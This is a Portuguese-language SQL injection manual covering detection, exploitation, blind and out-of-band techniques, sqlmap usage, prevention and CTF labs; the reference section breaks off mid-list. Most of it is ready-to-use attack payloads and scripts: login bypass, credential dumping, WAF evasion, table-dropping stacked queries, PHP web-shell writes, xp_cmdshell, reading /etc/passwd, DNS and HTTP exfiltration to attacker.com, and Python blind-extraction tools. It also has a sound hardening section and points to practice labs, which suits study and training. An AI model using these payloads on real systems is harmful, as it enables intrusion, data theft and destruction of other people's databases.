# 🎯 MANUAL COMPLETO SOBRE SQL INJECTION

## 📋 ÍNDICE
1. [Fundamentos do SQL Injection](#fundamentos-do-sql-injection)
2. [Tipos de SQL Injection](#tipos-de-sql-injection)
3. [Técnicas de Detecção](#técnicas-de-detecção)
4. [Exploração Básica](#exploração-básica)
5. [Técnicas Avançadas](#técnicas-avançadas)
6. [Database Fingerprinting](#database-fingerprinting)
7. [Data Extraction](#data-extraction)
8. [Blind SQL Injection](#blind-sql-injection)
9. [Out-of-Band SQLi](#out-of-band-sqli)
10. [Automação com Ferramentas](#automação-com-ferramentas)
11. [Prevenção e Mitigação](#prevenção-e-mitigação)
12. [CTF e Laboratórios](#ctf-e-laboratórios)
13. [Referência Rápida](#referência-rápida)

---

## 🔍 FUNDAMENTOS DO SQL INJECTION

### O que é SQL Injection?
SQL Injection é uma vulnerabilidade de segurança que permite a um atacante interferir nas queries SQL que uma aplicação executa no banco de dados. Isso pode resultar em:
- Acesso não autorizado a dados sensíveis
- Modificação ou exclusão de dados
- Execução de comandos administrativos no banco de dados
- Em alguns casos, execução de comandos no sistema operacional

### Como Ocorre?
```sql
-- Aplicação vulnerável
SELECT * FROM users WHERE username = '$username' AND password = '$password'

-- Se username = 'admin' OR '1'='1' --
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'qualquer'
-- Resultado: Retorna todos os usuários
```

### Mecanismo Básico
```
Entrada do usuário → Não sanitizada → Concatenada na query → Executada no DB
```

### Impacto da Vulnerabilidade
- **Confidencialidade**: Roubo de dados
- **Integridade**: Alteração de dados
- **Disponibilidade**: Exclusão de dados/tabelas
- **Autenticação**: Bypass de login
- **Autorização**: Elevação de privilégios

---

## 🎯 TIPOS DE SQL INJECTION

### 1. Classic SQL Injection
```sql
-- Entrada: admin' OR '1'='1
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
```

### 2. Union-Based SQLi
```sql
-- Entrada: ' UNION SELECT 1,2,3 --
SELECT nome, email FROM usuarios WHERE id = '1' UNION SELECT 1,2,3 -- '
```

### 3. Error-Based SQLi
```sql
-- Entrada: ' AND 1=CAST(0x5e5e5e5e AS INT) --
SELECT * FROM produtos WHERE id = '1' AND 1=CAST(0x5e5e5e5e AS INT) -- '
-- Gera erro revelando informações
```

### 4. Blind SQL Injection
```sql
-- Boolean-based Blind
' AND 1=1 --      → Retorna verdadeiro
' AND 1=2 --      → Retorna falso

-- Time-based Blind
'; IF(1=1) WAITFOR DELAY '0:0:5' --  → Atraso de 5 segundos
```

### 5. Out-of-Band SQLi
```sql
-- Usa funções como DNS/HTTP para exfiltrar dados
'; EXEC master..xp_dirtree '//atacker.com/'+@@version --
```

### 6. Second-Order SQLi
```sql
-- Injeção armazenada no banco, executada posteriormente
INSERT INTO comments (text) VALUES ('Texto normal'; DROP TABLE users --')
```

---

## 🔎 TÉCNICAS DE DETECÇÃO

### Testes Manuais Básicos
```sql
-- Teste de caractere especial
'            -- Verifica erro de sintaxe
"            -- Para strings com aspas duplas
\            -- Escape de caracteres
;            -- Terminador de query
```

### Payloads de Teste
```sql
-- Para parâmetros numéricos
1 OR 1=1
1 AND 1=2
1' OR '1'='1
1" OR "1"="1

-- Para parâmetros de string
' OR '1'='1
" OR "1"="1
' OR 1=1 --
" OR 1=1 --
admin' --
admin' OR '1'='1
```

### Detecção de Blind SQLi
```sql
-- Boolean-based
' AND '1'='1      -- Comportamento normal
' AND '1'='2      -- Comportamento diferente

-- Time-based
' AND SLEEP(5) --
'; WAITFOR DELAY '0:0:5' --
' OR pg_sleep(5) --
```

### WAF Bypass para Detecção
```sql
-- Evasão básica
' OR 'un'='un'    -- Em vez de ' OR '1'='1
' O/**/R '1'='1   -- Comentários inline
' OR 2>1 --       -- Expressões matemáticas
' OR true --      -- Palavras-chave alternativas
```

### Comportamentos Esperados
```
Teste                      | Resposta Normal | Resposta Vulnerável
---------------------------|-----------------|-------------------
'                          | Erro SQL        | Erro diferente/nenhum
' OR '1'='1                | Mesmo           | Mais resultados
' AND '1'='2               | Mesmo           | Menos resultados
' UNION SELECT null --     | Erro            | Funciona/erro diferente
```

---

## ⚡ EXPLORAÇÃO BÁSICA

### 1. Bypass de Login
```sql
-- Forma mais simples
' OR '1'='1
' OR 1=1 --
admin' --
' OR 'a'='a

-- Com comentários
admin'-- 
admin'/*
admin'#
admin'-- -
```

### 2. Determinar Número de Colunas
```sql
-- Usando ORDER BY
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --  -- Até gerar erro

-- Usando UNION
' UNION SELECT NULL --
' UNION SELECT NULL, NULL --
' UNION SELECT NULL, NULL, NULL --
```

### 3. Union-Based Data Extraction
```sql
-- Passo 1: Encontrar colunas úteis
' UNION SELECT 1,2,3,4,5 --

-- Passo 2: Extrair informações
' UNION SELECT 1,@@version,3,4,5 --
' UNION SELECT 1,user(),3,database(),5 --
' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables --
```

### 4. Extrair Estrutura do Banco
```sql
-- MySQL
' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables --
' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users' --

-- PostgreSQL
' UNION SELECT 1,tablename,3,4,5 FROM pg_tables --
' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users' --

-- SQL Server
' UNION SELECT 1,name,3,4,5 FROM sysobjects WHERE xtype='U' --
' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users' --
```

### 5. Extrair Dados
```sql
-- Extrair usuários e senhas
' UNION SELECT 1,username,password,4,5 FROM users --
' UNION SELECT 1,concat(username,':',password),3,4,5 FROM users --

-- Com LIMIT para controle
' UNION SELECT 1,username,password,4,5 FROM users LIMIT 0,1 --
' UNION SELECT 1,username,password,4,5 FROM users LIMIT 1,1 --
```

---

## 🚀 TÉCNICAS AVANÇADAS

### 1. Subqueries
```sql
-- Extrair dados sem UNION
' AND (SELECT 1 FROM users WHERE username='admin')=1 --
' OR EXISTS(SELECT * FROM users WHERE username='admin') --
```

### 2. Conditional Statements
```sql
-- MySQL
' AND IF(1=1, SLEEP(5), 0) --
' OR CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END --

-- SQL Server
'; IF 1=1 WAITFOR DELAY '0:0:5' --
'; SELECT CASE WHEN 1=1 THEN WAITFOR DELAY '0:0:5' ELSE 0 END --

-- PostgreSQL
' AND (SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE NULL END) --
```

### 3. String Concatenation
```sql
-- MySQL
' UNION SELECT CONCAT(username, ':', password),2,3 FROM users --
' OR username LIKE CONCAT('%', (SELECT password FROM users LIMIT 1), '%') --

-- SQL Server
' UNION SELECT username + ':' + password,2,3 FROM users --
```

### 4. Hexadecimal Encoding
```sql
-- Para bypass de filtros
' UNION SELECT 0x757365726E616D65,0x70617373776F7264,3 FROM users --
-- 0x757365726E616D65 = 'username' em hex
```

### 5. Comments para Evasão
```sql
'/**/OR/**/'1'/**/='1
'/*!50000OR*/'1'='1  -- MySQL version-specific comment
' OR '1'='1' -- 
' OR '1'='1' /*
' OR '1'='1' #
```

### 6. Stacked Queries
```sql
-- Executar múltiplas queries (se permitido)
'; DROP TABLE users; --
'; UPDATE users SET password='hacked' WHERE username='admin'; --
```

---

## 🏷️ DATABASE FINGERPRINTING

### Identificação por Comportamento
```sql
-- Comentários
'--      -- SQL Server, PostgreSQL
'#       -- MySQL
'/* */   -- Todos

-- Concatenção de strings
'abc' + 'def'    -- SQL Server
'abc' || 'def'   -- Oracle, PostgreSQL
CONCAT('abc','def') -- MySQL

-- Funções de versão
@@version        -- SQL Server, MySQL
version()        -- PostgreSQL
SELECT banner FROM v$version -- Oracle
```

### Payloads Específicos por SGBD

#### MySQL
```sql
' AND 1=1 -- 
' UNION SELECT @@version,2,3 --
' AND SLEEP(5) --
' OR MID(@@version,1,1)='5' --
' UNION SELECT user(),database(),3 --
' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
```

#### PostgreSQL
```sql
' AND 1=1 -- 
' UNION SELECT version(),2,3 --
' AND pg_sleep(5) --
' OR SUBSTRING(version(),1,1)='1' --
' UNION SELECT current_user,current_database(),3 --
```

#### SQL Server
```sql
' AND 1=1 -- 
'; SELECT @@version --
'; WAITFOR DELAY '0:0:5' --
' OR SUBSTRING(@@version,1,1)='1' --
' UNION SELECT SYSTEM_USER,DB_NAME(),3 --
```

#### Oracle
```sql
' AND 1=1 -- 
' UNION SELECT banner,2,3 FROM v$version --
' AND (SELECT COUNT(*) FROM all_users) > 0 --
' OR (SELECT SUBSTR(banner,1,1) FROM v$version WHERE rownum=1)='O' --
```

### Detalhamento por SGBD

#### MySQL
```sql
-- System variables
@@version, @@version_comment, @@hostname

-- Information schema
SELECT table_name FROM information_schema.tables
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Users and privileges
SELECT user, host FROM mysql.user
SELECT current_user()
SELECT database()

-- File system access
SELECT LOAD_FILE('/etc/passwd')
INTO OUTFILE '/tmp/backdoor.php'

-- Time-based
BENCHMARK(1000000, MD5('test'))
SLEEP(5)
```

#### PostgreSQL
```sql
-- Version info
SELECT version()
SELECT current_setting('server_version')

-- System catalog
SELECT tablename FROM pg_tables
SELECT column_name FROM information_schema.columns

-- Users
SELECT usename FROM pg_user
SELECT current_user
SELECT current_database()

-- File operations (superuser only)
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/backdoor.php'
pg_read_file('/etc/passwd')

-- Time delay
pg_sleep(5)
```

#### SQL Server
```sql
-- Version
SELECT @@version
SELECT SERVERPROPERTY('ProductVersion')

-- System tables
SELECT name FROM sysobjects WHERE xtype='U'
SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')

-- Users
SELECT SYSTEM_USER
SELECT USER_NAME()
SELECT DB_NAME()

-- Extended procedures
EXEC xp_cmdshell 'whoami'
EXEC master..xp_dirtree 'c:\'

-- Time delay
WAITFOR DELAY '0:0:5'
```

#### Oracle
```sql
-- Version
SELECT banner FROM v$version
SELECT * FROM product_component_version

-- Tables
SELECT table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'

-- Users
SELECT user FROM dual
SELECT name FROM sys.user$

-- UTL functions (if enabled)
SELECT UTL_INADDR.get_host_name('attacker.com') FROM dual
SELECT UTL_HTTP.request('http://attacker.com/'||(SELECT user FROM dual)) FROM dual

-- Time delay (DBMS_LOCK.SLEEP requires privs)
BEGIN DBMS_LOCK.SLEEP(5); END;
```

---

## 📊 DATA EXTRACTION

### 1. Extração Básica de Dados
```sql
-- Todos os dados de uma tabela
' UNION SELECT * FROM users --

-- Colunas específicas
' UNION SELECT username, password, email FROM users --

-- Com filtro
' UNION SELECT username, password FROM users WHERE admin=1 --
```

### 2. Técnicas para Blind SQLi

#### Boolean-based
```sql
-- Determinar comprimento
' AND LENGTH((SELECT password FROM users WHERE username='admin'))=10 --

-- Extrair caractere por caractere
' AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a' --
' AND ASCII(SUBSTR((SELECT password FROM users WHERE username='admin'),1,1))=97 --
```

#### Time-based
```sql
-- MySQL
' AND IF(ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))=97, SLEEP(5), 0) --

-- PostgreSQL
' AND (SELECT CASE WHEN ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))=97 THEN pg_sleep(5) ELSE NULL END) --

-- SQL Server
'; IF ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))=97 WAITFOR DELAY '0:0:5' --
```

### 3. Encoding e Formatação

#### Concatenar múltiplas colunas
```sql
-- MySQL
' UNION SELECT CONCAT(username, '|', password, '|', email),2,3 FROM users --

-- PostgreSQL
' UNION SELECT username || '|' || password || '|' || email,2,3 FROM users --

-- SQL Server
' UNION SELECT username + '|' + password + '|' + email,2,3 FROM users --
```

#### Group concatenation
```sql
-- MySQL
' UNION SELECT GROUP_CONCAT(username SEPARATOR ', '),2,3 FROM users --

-- PostgreSQL
' UNION SELECT STRING_AGG(username, ', '),2,3 FROM users --

-- SQL Server
' UNION SELECT STUFF((SELECT ',' + username FROM users FOR XML PATH('')),1,1,''),2,3 --
```

### 4. Bypass de Filtros

#### Case variation
```sql
' OR 1=1 --
' Or 1=1 --
' oR 1=1 --
' OR '1'='1' --
```

#### Double encoding
```sql
%2527 OR 1=1 --           (URL encoded twice)
%27%20OR%201%3D1%20--     (Normal URL encoding)
```

#### Unicode
```sql
%u0027 OR 1=1 --
%u02b9 OR 1=1 --
```

#### Whitespace alternatives
```sql
'%09OR%091=1--
'%0AOR%0A1=1--
'%0COR%0C1=1--
'%0DOR%0D1=1--
'/**/OR/**/1=1--
```

#### SQL comments
```sql
'/*comment*/OR/*comment*/1=1--
'/*!50000OR*/1=1--        (MySQL version-specific)
```

---

## 👁️ BLIND SQL INJECTION

### Detecção de Blind SQLi

#### Boolean-based
```sql
-- Resposta diferente para verdadeiro/falso
?id=1 AND 1=1  -- Normal response
?id=1 AND 1=2  -- Different/empty response

-- Usando condições
?id=1 AND (SELECT 1)=1
?id=1 AND (SELECT 1 FROM users WHERE username='admin')=1
```

#### Time-based
```sql
-- Verificar se há atraso
?id=1; WAITFOR DELAY '0:0:5'--      (SQL Server)
?id=1 AND SLEEP(5)--                (MySQL)
?id=1 AND pg_sleep(5)--             (PostgreSQL)

-- Condicional
?id=1 AND IF(1=1, SLEEP(5), 0)--
```

### Extração de Dados via Blind SQLi

#### Comprimento de dados
```sql
-- Boolean-based
?id=1 AND LENGTH((SELECT password FROM users WHERE username='admin'))>10

-- Time-based
?id=1 AND IF(LENGTH((SELECT password FROM users WHERE username='admin'))>10, SLEEP(5), 0)
```

#### Extração caractere por caractere
```sql
-- Verificar primeiro caractere
?id=1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'

-- Via ASCII
?id=1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97

-- Time-based
?id=1 AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97, SLEEP(5), 0)
```

#### Script Python para Blind SQLi
```python
import requests
import string
import time

def blind_sqli(url, param, payload_template):
    """Extrai dados via blind SQL injection"""
    
    chars = string.printable
    extracted = ""
    position = 1
    
    while True:
        found = False
        
        for char in chars:
            # Construir payload
            payload = payload_template.format(pos=position, char=ord(char))
            
            # Fazer requisição
            params = {param: payload}
            start = time.time()
            response = requests.get(url, params=params)
            elapsed = time.time() - start
            
            # Time-based detection
            if elapsed > 2:  # Atraso detectado
                extracted += char
                print(f"[+] Position {position}: {char}")
                found = True
                position += 1
                break
        
        if not found:
            print(f"[*] Extraction complete: {extracted}")
            break
    
    return extracted

# Exemplo de uso
if __name__ == "__main__":
    url = "http://vulnerable-site.com/page.php"
    param = "id"
    
    # Template para MySQL time-based
    payload_template = "1' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{pos},1))={char}, SLEEP(2), 0) -- "
    
    password = blind_sqli(url, param, payload_template)
    print(f"Password: {password}")
```

### Otimização de Blind SQLi

#### Binary search
```python
def extract_char_binary(url, param, position):
    """Extrai um caractere usando busca binária"""
    
    low, high = 32, 126  # ASCII printable range
    
    while low <= high:
        mid = (low + high) // 2
        
        # Testar se caractere <= mid
        payload = f"1' AND ASCII(SUBSTRING((SELECT password FROM users),{position},1))<={mid} -- "
        if test_condition(url, param, payload):
            high = mid - 1
        else:
            low = mid + 1
    
    return chr(low) if low <= 126 else ''

def test_condition(url, param, payload):
    """Testa se a condição é verdadeira"""
    params = {param: payload}
    response = requests.get(url, params=params)
    return "exists" in response.text  # Ajustar para resposta real
```

#### Bit-by-bit extraction
```sql
-- Extrair bit a bit (mais preciso)
' AND (ASCII(SUBSTRING((SELECT password),1,1)) >> 0) & 1 = 1 --
' AND (ASCII(SUBSTRING((SELECT password),1,1)) >> 1) & 1 = 1 --
-- Continua para cada bit (7 bits para ASCII)
```

---

## 🌐 OUT-OF-BAND SQL INJECTION

### Quando Usar Out-of-Band?
- Quando não há resposta direta (Blind SQLi muito lento)
- Quando firewalls bloqueiam respostas
- Para extrair grandes volumes de dados
- Para contornar WAFs

### Técnicas por SGBD

#### SQL Server
```sql
-- DNS exfiltration
'; EXEC master..xp_dirtree '//attacker.com/'+@@version --
'; DECLARE @data VARCHAR(1024); SET @data=(SELECT @@version); EXEC('xp_dirtree "//'+@data+'.attacker.com/"') --

-- HTTP requests
'; EXEC sp_OACreate 'MSXML2.XMLHTTP', @obj OUT; EXEC sp_OAMethod @obj, 'open', NULL, 'GET', 'http://attacker.com/'+@@version, false; --
```

#### Oracle
```sql
-- UTL_HTTP
' AND (SELECT UTL_HTTP.request('http://attacker.com/'||(SELECT user FROM dual)) FROM dual) IS NOT NULL --

-- UTL_INADDR
' AND (SELECT UTL_INADDR.get_host_name((SELECT user FROM dual)||'.attacker.com') FROM dual) IS NOT NULL --

-- HTTPURITYPE
' AND (SELECT HTTPURITYPE('http://attacker.com/'||(SELECT user FROM dual)).getclob() FROM dual) IS NOT NULL --
```

#### MySQL
```sql
-- LOAD_FILE (requer FILE privilege)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker.com\\test.txt')) --

-- INTO OUTFILE
SELECT @@version INTO OUTFILE '\\\\attacker.com\\share\\version.txt'
```

#### PostgreSQL
```sql
-- COPY command
'; COPY (SELECT version()) TO PROGRAM 'nslookup $(SELECT version()).attacker.com' --

-- dblink (if installed)
' AND (SELECT * FROM dblink('host=attacker.com user=test password=test dbname=test', 
      'SELECT version()') RETURNS (result TEXT)) --
```

### Exfiltration via DNS
```sql
-- Técnica básica
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT HEX(password) FROM users LIMIT 1),'.attacker.com\\')) --

-- Com subdomínios
' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT SUBSTRING(password,1,10) FROM users),'.attacker.com\\'))) --
```

### Ferramentas para Out-of-Band

#### DNSExfiltrator
```bash
# Configurar servidor DNS
python dns_exfil.py --server

# Payload para extrair dados
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.yourdomain.com\\')) --
```

#### SQLMap com out-of-band
```bash
# Usar DNS para exfiltração
sqlmap -u "http://site.com/page?id=1" --dns-domain=attacker.com

# Usar HTTP
sqlmap -u "http://site.com/page?id=1" --os-shell --hostname
```

---

## 🤖 AUTOMAÇÃO COM FERRAMENTAS

### SQLMap - A Ferramenta Mais Poderosa

#### Instalação
```bash
# Kali Linux (pré-instalado)
apt update && apt install sqlmap

# Manual
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py --help
```

#### Uso Básico
```bash
# Teste básico
sqlmap -u "http://site.com/page.php?id=1"

# Especificar parâmetro
sqlmap -u "http://site.com/page.php" --data="id=1&name=test"

# Com cookie
sqlmap -u "http://site.com/page.php" --cookie="PHPSESSID=abc123"

# Método POST
sqlmap -u "http://site.com/login.php" --data="username=admin&password=test" --method=POST
```

#### Detecção e Enumeração
```bash
# Listar databases
sqlmap -u "http://site.com/page?id=1" --dbs

# Listar tabelas
sqlmap -u "http://site.com/page?id=1" -D database_name --tables

# Listar colunas
sqlmap -u "http://site.com/page?id=1" -D database_name -T users --columns

# Dump de dados
sqlmap -u "http://site.com/page?id=1" -D database_name -T users -C username,password --dump

# Dump completo
sqlmap -u "http://site.com/page?id=1" -D database_name --dump-all
```

#### Técnicas Avançadas
```bash
# Forçar SGBD específico
sqlmap -u "http://site.com/page?id=1" --dbms=mysql

# Level e risk (1-5)
sqlmap -u "http://site.com/page?id=1" --level=3 --risk=2

# Técnicas específicas
sqlmap -u "http://site.com/page?id=1" --technique=BEUST  # B:Boolean, E:Error, U:Union, S:Stacked, T:Time

# Time-based com delay
sqlmap -u "http://site.com/page?id=1" --technique=T --time-sec=5

# Bypass WAF
sqlmap -u "http://site.com/page?id=1" --tamper=space2comment,between

# Proxy para debugging
sqlmap -u "http://site.com/page?id=1" --proxy="http://127.0.0.1:8080"
```

#### OS Interaction
```bash
# Shell interativo
sqlmap -u "http://site.com/page?id=1" --os-shell

# Comando específico
sqlmap -u "http://site.com/page?id=1" --os-cmd="whoami"

# Upload de arquivo
sqlmap -u "http://site.com/page?id=1" --file-write="/local/path" --file-dest="/remote/path"

# Download de arquivo
sqlmap -u "http://site.com/page?id=1" --file-read="/etc/passwd"
```

#### Tampers (WAF Bypass)
```bash
# Listar tampers
sqlmap --list-tampers

# Usar múltiplos tampers
sqlmap -u "http://site.com/page?id=1" --tamper="between,randomcase,space2comment"

# Tampers comuns:
# space2comment:   espaço → /**/
# between:         = → BETWEEN 0 AND # (para MySQL)
# chardoubleencode: dupla codificação
# randomcase:      case randomizado
# unionalltounion: UNION ALL → UNION
```

### Outras Ferramentas

#### NoSQLMap (para NoSQL Injection)
```bash
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
python nosqlmap.py
```

#### jSQL Injection (GUI)
```bash
# Java-based GUI
java -jar jsql-injection-v0.85.jar
```

#### Havij (Windows - obsoleto mas ainda usado)
```
Interface gráfica para SQL injection
```

### Scripts Personalizados

#### Python para SQLi Testing
```python
import requests
from bs4 import BeautifulSoup
import urllib.parse

class SQLiTester:
    def __init__(self, url, params):
        self.url = url
        self.params = params
        self.session = requests.Session()
    
    def test_parameter(self, param, value, payloads):
        """Testa um parâmetro com múltiplos payloads"""
        
        results = {}
        
        for payload_name, payload in payloads.items():
            # Substituir payload no valor
            test_value = value.replace("FUZZ", payload)
            
            # Preparar parâmetros
            test_params = self.params.copy()
            test_params[param] = test_value
            
            # Enviar requisição
            try:
                response = self.session.get(self.url, params=test_params)
                
                # Analisar resposta
                if self.is_vulnerable(response, payload_name):
                    results[payload_name] = {
                        'payload': payload,
                        'response_length': len(response.text),
                        'vulnerable': True
                    }
                else:
                    results[payload_name] = {
                        'payload': payload,
                        'response_length': len(response.text),
                        'vulnerable': False
                    }
                    
            except Exception as e:
                results[payload_name] = {
                    'payload': payload,
                    'error': str(e),
                    'vulnerable': False
                }
        
        return results
    
    def is_vulnerable(self, response, payload_type):
        """Detecta vulnerabilidade baseada na resposta"""
        
        indicators = {
            'syntax_error': [
                'SQL syntax',
                'mysql_fetch',
                'syntax error',
                'unclosed quotation',
                'You have an error in your SQL'
            ],
            'union_based': [
                'different number of columns',
                'ORDER BY clause'
            ],
            'blind': [
                # Baseado em diferenças de resposta
            ]
        }
        
        text = response.text.lower()
        
        for indicator in indicators.get(payload_type, []):
            if indicator.lower() in text:
                return True
        
        return False
    
    def automated_test(self):
        """Teste automatizado completo"""
        
        payloads = {
            'single_quote': "'",
            'or_true': "' OR '1'='1",
            'comment': "' -- ",
            'union_columns': "' UNION SELECT NULL -- ",
            'time_delay': "' AND SLEEP(5) -- "
        }
        
        for param, value in self.params.items():
            print(f"\n[*] Testing parameter: {param}")
            results = self.test_parameter(param, value, payloads)
            
            for payload_name, result in results.items():
                status = "VULNERABLE" if result.get('vulnerable') else "SAFE"
                print(f"    {payload_name}: {status}")

# Uso
if __name__ == "__main__":
    url = "http://testphp.vulnweb.com/artists.php"
    params = {"artist": "1"}
    
    tester = SQLiTester(url, params)
    tester.automated_test()
```

---

## 🛡️ PREVENÇÃO E MITIGAÇÃO

### 1. Prepared Statements (Parameterized Queries)
```python
# Python com MySQL
import mysql.connector

# VULNERÁVEL
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"

# CORRETO (usando prepared statements)
query = "SELECT * FROM users WHERE username = %s AND password = %s"
cursor.execute(query, (username, password))

# Python com SQLite
import sqlite3
conn = sqlite3.connect('database.db')
cursor = conn.cursor()

# CORRETO
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
```

### 2. Stored Procedures
```sql
-- Criar stored procedure
CREATE PROCEDURE GetUser (@Username NVARCHAR(50), @Password NVARCHAR(50))
AS
BEGIN
    SELECT * FROM users WHERE username = @Username AND password = @Password
END

-- Chamar de forma segura
EXEC GetUser @Username = 'admin', @Password = 'password123'
```

### 3. Input Validation
```python
def validate_input(input_string):
    """Validação rigorosa de entrada"""
    
    # Whitelist de caracteres permitidos
    import re
    
    # Para nomes de usuário
    if not re.match(r'^[a-zA-Z0-9_@.-]{3,30}$', input_string):
        raise ValueError("Invalid input")
    
    # Para números
    if not input_string.isdigit():
        raise ValueError("Must be numeric")
    
    return input_string

# Outras validações
def sanitize_input(input_string):
    """Sanitização básica"""
    import html
    
    # Escapar HTML
    sanitized = html.escape(input_string)
    
    # Remover caracteres perigosos para SQL
    dangerous = ["'", '"', ";", "--", "/*", "*/", "#"]
    for char in dangerous:
        sanitized = sanitized.replace(char, "")
    
    return sanitized
```

### 4. Least Privilege Principle
```sql
-- Criar usuário com privilégios mínimos
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strongpassword';
GRANT SELECT, INSERT, UPDATE ON database.users TO 'webapp'@'localhost';
REVOKE DROP, CREATE, ALTER, GRANT OPTION FROM 'webapp'@'localhost';

-- NUNCA usar root/sa para aplicação web
```

### 5. Web Application Firewall (WAF)
```nginx
# ModSecurity rules
SecRule ARGS "@detectSQLi" "id:1,phase:2,deny,status:403"

# Cloudflare WAF
# AWS WAF
# Azure Application Gateway
```

### 6. Database Hardening
```sql
-- Desabilitar funções perigosas
-- MySQL
REVOKE FILE ON *.* FROM 'webapp'@'localhost';

-- SQL Server
DENY EXECUTE ON xp_cmdshell TO webapp_user;
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

-- PostgreSQL
REVOKE EXECUTE ON FUNCTION pg_read_file(text) FROM PUBLIC;
REVOKE EXECUTE ON FUNCTION dblink_connect(text) FROM PUBLIC;
```

### 7. Logging and Monitoring
```python
# Log de tentativas de SQLi
import logging
from datetime import datetime

def log_sqli_attempt(query, ip_address):
    logging.warning(f"Potential SQLi attempt detected: {query} from {ip_address} at {datetime.now()}")
    
    # Alertar administrador
    send_alert_email(f"SQLi attempt from {ip_address}")
    
    # Bloquear IP temporariamente
    block_ip(ip_address)
```

### 8. ORM (Object-Relational Mapping)
```python
# Django ORM (seguro por padrão)
from django.db import models

# Consulta segura
User.objects.filter(username=username, password=password)

# SQLAlchemy
from sqlalchemy import create_engine, text

# Uso seguro
stmt = text("SELECT * FROM users WHERE username = :username")
result = engine.execute(stmt, username=user_input)
```

### 9. Content Security Policy (CSP)
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
```

### 10. Regular Security Testing
```bash
# Scans regulares
sqlmap -u "https://your-site.com" --crawl=2 --batch

# SAST tools
# DAST tools
# Manual testing
```

---

## 🧪 CTF E LABORATÓRIOS

### Laboratórios para Prática

#### 1. DVWA (Damn Vulnerable Web Application)
```bash
# Instalação com Docker
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# Níveis de dificuldade
# Low: Nenhuma proteção
# Medium: Basic filtering
# High: Prepared statements
```

#### 2. SQLi Labs
```bash
# GitHub
git clone https://github.com/Audi-1/sqli-labs
cd sqli-labs
# Configurar Apache + MySQL
```

#### 3. WebGoat
```bash
# Java-based
docker run -p 8080:8080 -p 9090:9090 webgoat/webgoat
```

#### 4. HackTheBox
```
# Máquinas com SQLi:
- Jerry
- Bastion
- Bastard
- Arctic
```

#### 5. TryHackMe
```
Rooms:
- Intro to SQL Injection
- SQHell
- Advent of Cyber 2021
```

### CTF Challenges Comuns

#### 1. Simple Login Bypass
```sql
-- Challenge: Login sem credenciais
' OR '1'='1
admin' --
' OR 1=1 --
```

#### 2. Union-Based Extraction
```sql
-- Determinar número de colunas
' ORDER BY 1 --
' UNION SELECT NULL, NULL, NULL --

-- Extrair dados
' UNION SELECT 1,@@version,3,4 --
```

#### 3. Blind SQLi
```python
# Script para CTF
import requests
import string

url = "http://ctf.com/challenge"
chars = string.ascii_letters + string.digits + "{}_"

flag = ""
for i in range(1, 50):
    for char in chars:
        payload = f"admin' AND SUBSTR((SELECT flag FROM flags),{i},1)='{char}' -- "
        r = requests.get(url, params={'id': payload})
        if "Welcome" in r.text:
            flag += char
            print(f"[+] Found: {flag}")
            break
```

#### 4. Second-Order SQLi
```sql
-- Inserir payload que será executado depois
INSERT INTO users (username) VALUES ('admin'); DROP TABLE users --')
```

### Write-ups de CTFs

#### Exemplo: Basic SQLi CTF
```
1. Encontrar parâmetro vulnerável: ?id=1
2. Testar: ?id=1'
3. Determinar colunas: ?id=1 ORDER BY 4-- (erro em 4, então 3 colunas)
4. Union: ?id=-1 UNION SELECT 1,2,3--
5. Extrair: ?id=-1 UNION SELECT 1,@@version,database()--
6. Tabelas: ?id=-1 UNION SELECT 1,table_name,3 FROM information_schema.tables--
7. Colunas: ?id=-1 UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
8. Dados: ?id=-1 UNION SELECT 1,username,password FROM users--
```

---

## 📋 REFERÊNCIA RÁPIDA

### Payloads Comuns
```sql
-- Authentication Bypass
' OR '1'='1
' OR 1=1 --
admin' --
' OR 'a'='a
') OR ('a'='a

-- Union-Based
' UNION SELECT NULL --
' UNION SELECT 1,2,3 --
' UNION SELECT @@version,2,3 --

-- Error-Based
' AND 1=CAST(0x5e5e5e5e AS INT) --
' OR 1=CONVERT(int,@@version) --

-- Blind Boolean
' AND 1=1 --
' AND 1=2 --

-- Time-Based
'; WAITFOR DELAY '0:0:5' --
' AND SLEEP(5) --
```

### Database-Specific Payloads

#### MySQL
```sql
-- Version
@@version
VERSION()

-- Current User
USER()
CURRENT_USER()
SYSTEM_USER()

-- Database
DATABASE()

-- Tables
SELECT table_name FROM information_schema.tables

-- Columns
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- File Read
